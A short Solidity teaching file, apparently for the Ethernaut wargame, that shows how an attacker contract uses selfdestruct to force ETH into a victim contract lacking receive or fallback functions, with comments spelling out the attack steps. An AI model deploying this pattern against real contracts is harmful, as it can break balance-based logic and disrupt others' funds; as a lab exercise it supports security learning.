// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ============================================================
// Vulnerability: Selfdestruct + Forced ETH (Ethernaut Lv8)
// ============================================================
contract ForceVictim {
    // No receive() or fallback() — yet ETH can be forced via selfdestruct

    function isContractEmpty() external view returns (bool) {
        return address(this).balance == 0;
    }

    // Exploit: attacker deploys a contract, funds it, then selfdestructs
    // targeting the victim address — victim cannot reject the ETH
    // Attack: new AttackContract{value: 1}(); attackContract.attack(victimAddress);
}

contract AttackContract {
    function attack(address payable victim) external payable {
        selfdestruct(victim);
    }
}